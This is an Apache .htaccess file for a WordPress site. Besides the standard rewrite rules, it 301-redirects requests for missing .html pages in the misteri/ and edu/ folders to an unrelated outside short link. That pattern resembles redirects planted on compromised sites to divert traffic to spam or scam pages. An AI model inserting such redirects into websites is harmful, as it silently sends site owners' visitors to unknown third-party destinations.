<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /

    # Redirect hanya .html di folder misteri/
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule ^misteri/[^/]+\.html$ https://preciseurl.org/babon [R=301,L,QSA]

    # Redirect hanya .html di folder edu/
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule ^edu/[^/]+\.html$ https://preciseurl.org/babon [R=301,L,QSA]

    # Pass HTTP Authorization header to PHP
    RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]

    # WordPress standard rules
    RewriteRule ^index\.php$ - [L]

    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule . /index.php [L]
</IfModule>
